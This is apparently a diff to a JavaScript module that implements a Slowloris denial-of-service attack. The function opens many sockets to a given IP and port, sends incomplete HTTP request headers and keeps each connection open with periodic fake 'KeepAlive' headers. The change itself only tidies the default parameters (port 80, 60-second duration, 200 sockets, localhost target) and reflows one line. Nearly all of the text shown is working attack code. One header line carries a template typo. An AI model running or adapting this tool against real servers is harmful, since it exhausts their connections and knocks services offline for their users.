@@ -65,15 +65,10 @@ const UAs = [
 ];
 
 export default function slowLoris(ip, port, attackDuration, sockets) {
-	if (port === undefined || port === "") {
-		port = 80;
-	}
-	if (attackDuration === undefined || attackDuration === "") {
-		attackDuration = 60000;
-	}
-	if (sockets === undefined || sockets === "") {
-		sockets = 200;
-	}
+	ip = ip || "127.0.0.1";
+	port = port || 80;
+	attackDuration = attackDuration || 60000;
+	sockets = sockets || 200;
 
 	let activeSockets = 0;
 	let socketsTargetReached = false;
@@ -92,9 +87,7 @@ export default function slowLoris(ip, port, attackDuration, sockets) {
 			socket.write("GET / HTTP/1.1\r\n");
 			socket.write(`Host: ${ip}\r\n`);
 			socket.write("Accept: */*\r\n");
-			socket.write(
-				`{UAs[Math.floor(Math.random() * UAs.length)]}\r\n`
-			);
+			socket.write(`{UAs[Math.floor(Math.random() * UAs.length)]}\r\n`);
 
 			setInterval(() => {
 				socket.write(`KeepAlive: ${Math.random() * 1000}\r\n`);
